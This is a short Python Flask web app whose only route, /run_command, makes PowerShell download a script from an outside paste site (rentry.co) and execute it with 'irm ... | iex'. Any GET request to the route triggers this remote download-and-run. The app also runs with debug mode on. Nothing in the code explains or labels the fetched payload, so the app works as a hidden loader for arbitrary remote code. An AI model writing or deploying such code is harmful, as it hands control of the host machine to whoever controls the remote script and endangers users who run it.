from flask import Flask, request
import subprocess

app = Flask(__name__)

@app.route('/run_command', methods=['GET'])
def run_command():
    cmd = "irm rentry.co/Testy123/raw | iex"
    completed = subprocess.run(["powershell", "-Command", cmd], capture_output=True)
    if completed.returncode != 0:
        return "An error occurred: {}".format(completed.stderr)
    else:
        return "Command executed successfully!"

if __name__ == '__main__':
    app.run(debug=True)
